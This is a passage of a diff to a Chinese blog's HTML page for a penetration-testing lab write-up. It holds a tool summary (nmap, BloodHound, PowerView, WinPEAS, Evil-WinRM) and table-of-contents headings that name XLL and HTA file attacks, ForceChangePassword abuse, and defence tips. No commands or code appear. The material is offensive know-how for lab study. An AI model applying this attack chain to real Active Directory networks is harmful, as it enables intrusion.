+</ul>
+</li>
+</ol>
+<h3 id="工具总结"><a href="#工具总结" class="headerlink" title="工具总结"></a>工具总结</h3><ul>
+<li><strong>信息收集</strong>：naabu、nmap</li>
+<li><strong>域内渗透</strong>：BloodHound、PowerView</li>
+<li><strong>权限提升</strong>：WinPEAS</li>
+<li><strong>远程连接</strong>：Evil-WinRM</li>
 </ul>
 </div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
@@ -473,7 +564,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.8.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">主机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTA"><span class="toc-number">1.5.1.</span> <span class="toc-text">HTA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForceChangePassword-%EF%BC%88%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">ForceChangePassword （强制更改密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.9.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 服务枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP-%E6%9C%8D%E5%8A%A1-25-TCP"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SMTP 服务 (25&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%9C%8D%E5%8A%A1-53-TCP"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">DNS 服务 (53&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E6%9C%8D%E5%8A%A1-80-TCP"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">Web 服务 (80&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">域控服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RPC-%E6%9C%8D%E5%8A%A1-135-TCP"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">RPC 服务 (135&#x2F;TCP)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">攻击面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.7.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.8.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.9.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XLL-%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. XLL 文件攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 获取初始访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">🔍 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 自动化枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 邮件系统枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTA-%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. HTA 文件攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. 域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. 权限提升路径分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-PowerView-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. 利用 PowerView 修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. 系统权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.7.</span> <span class="toc-text">📚 知识点回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.1.</span> <span class="toc-text">1. 信息收集技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-number">1.7.2.</span> <span class="toc-text">2. 攻击技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.3.</span> <span class="toc-text">3. 权限提升技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">🎯 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.1.</span> <span class="toc-text">攻击链回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.8.2.</span> <span class="toc-text">防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.3.</span> <span class="toc-text">工具总结</span></a></li></ol></li></ol></li></ol>
       </div>
     
 
